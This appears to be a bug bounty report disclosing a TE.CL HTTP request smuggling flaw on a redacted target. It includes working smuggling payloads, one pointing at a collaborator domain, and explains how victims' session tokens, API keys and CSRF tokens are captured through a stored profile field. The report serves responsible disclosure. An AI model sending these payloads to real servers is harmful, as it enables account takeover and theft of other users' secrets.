# impact

The Attacker can smuggle the HTTP request and leak other users request's with (Session Tokens,Keys,Api Keys,CSRF token and usernames and passwords) using web app at the same time.


# Description
### Account takeover
if you are unaware of HTTP request smuggeling please visit this [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)

The server is Vulnerable to `TE.CL Smuggeling attack` in which if this is a request sent to the server

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```
The front-end server processes the Transfer-Encoding header, and so treats the message body as using chunked encoding. It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following SMUGGLED. It processes the second chunk, which is stated to be zero length, and so is treated as terminating the request. This request is forwarded on to the back-end server.

The back-end server processes the Content-Length header and determines that the request body is 3 bytes long, up to the start of the line following 8. The following bytes, starting with SMUGGLED, are left unprocessed, and the back-end server will treat these as being the start of the next request in the sequence.


So to exploit this vulnerability an attacker can send the fallowing request to the server

```http
POST / HTTP/1.1
Host: <target.com>
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding:  chunked

87
POST /hopefully404 HTTP/1.1
Host: your-collaborator-domain
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```

in which this part of the request is kept waiting on the server

```http
POST /hopefully404 HTTP/1.1
Host: your-collaborator-domain
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
```

Once any new user sends any http request to the server let say if user sends this request

```http
POST /userdetails.php HTTP/1.1
Host: <target.com>
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
CSRFToken=1234

apiKey=1212
```

it will get mixed with the previous request waiting for the next part of the request

POST /hopefully404 HTTP/1.1
Host: <target.com>
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
```http
x=1POST /userdetails.php?token=1234 HTTP/1.1
Host: <target.com>
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
CSRFToken=1234

apiKey=1212
```

and user will get an 404 for a Valid Request. Please check the video `Confirmation.mkv` to see the practicle demo.


#Exploitation
Now this vulnerability can be exploited in many ways but one of the way is to leak http requests of others with their Session Id and API keys (including Developers)

This request is used to update this fallowing settings

```http

POST /profile 
*********
*********
*********
```

Now an attacker can smuggle a request which will look like this

```
POST / HTTP/1.1
Host: <target.com>
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 5
Transfer-Encoding:  chunked

4bd
POST /profile 
*********
*********
*********
```

Now when somone else hits my request his request will get concatinated to my request

```http
POST /profile 
*********
*********
*********description=POST /userdetails.php HTTP/1.1
Host: <target.com>
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
CSRFToken=1234

apiKey=1212
```
and the whole http request gets saved to my *******************

description.png

Now the attacker can do the same things again and again to get session tokens of as many as user

### Exposing internal secrets
Sometimes when an fronted adds some secrets,tokens,apikeys,header to the request before sending it to the backend and Since here the (victims-Request)next request is getting attached to my request at the backed it can expose all the headers,ip,token and api keys added by the front end
Here are some headers and IP which i are used in internal API requests which i was able to expose to me
```
************
************
************

```
#Steps to reproduce
Since the issues is really hard to reproduce manually i will suggest you to use this burp plugin to scan and exploit (demo) the issue.

Automatic
You can use https://github.com/PortSwigger/http-request-smuggler this for scanning and exploit the vulnerebility

please fallow these https://github.com/portswigger/http-request-smuggler instructions to reproduce the issue

#Refrences

What is this attack ?
```
https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn?source=post_page-----7c40e246021c----------------------
```
How to find it ?
```
https://portswigger.net/web-security/request-smuggling/finding?source=post_page-----7c40e246021c----------------------
```


How to Exploit it?
```
https://portswigger.net/web-security/request-smuggling/exploiting?source=post_page-----7c40e246021c----------------------
```
